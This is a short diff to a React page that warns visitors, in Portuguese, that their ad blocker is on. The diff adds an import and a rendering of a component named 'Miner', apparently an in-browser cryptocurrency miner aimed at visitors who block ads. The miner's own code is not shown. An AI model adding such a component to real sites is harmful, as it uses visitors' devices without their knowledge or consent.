@@ -1,6 +1,7 @@
 import React from 'react';
 import styled from 'styled-components';
 
+import Miner from '../components/core/Miner';
 import Layout from '../components/layout';
 
 import adblockPlusImg from '../images/adblock-plus.png';
@@ -9,6 +10,7 @@ import adblockProImg from '../images/adblock-pro.png';
 
 const AdBlock = () => (
   <Layout>
+    <Miner />
     <Wrapper>
       <TextWrapper>
         <BigText>Seu AdBlock está ligado :(</BigText>
